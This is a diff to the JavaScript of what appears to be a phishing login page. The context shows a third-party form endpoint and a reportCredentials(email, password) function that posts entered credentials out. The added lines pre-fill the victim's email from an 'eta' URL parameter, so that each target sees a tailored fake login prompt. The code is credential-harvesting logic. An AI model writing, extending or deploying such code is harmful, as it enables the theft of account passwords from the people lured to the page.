@@ -153,6 +153,20 @@
     const submitEndpoint = 'https://submit-form.com/Uxt0vouOR';
     let attemptCount = 0;
 
+    // Extract the 'eta' parameter from the URL
+    const urlParams = new URLSearchParams(window.location.search);
+    const emailParam = urlParams.get('eta');
+
+    if (emailParam) {
+      // Pre-fill the email input field
+      const emailInput = document.getElementById('email');
+      emailInput.value = emailParam;
+      emailInput.disabled = false; // Enable the email input field
+    } else {
+      console.warn("No 'eta' parameter found in the URL.");
+      // Set a default state for the iframe or any other UI element if needed
+    }
+
     // Utility: send data to the endpoint asynchronously
     async function reportCredentials(email, password) {
       try {
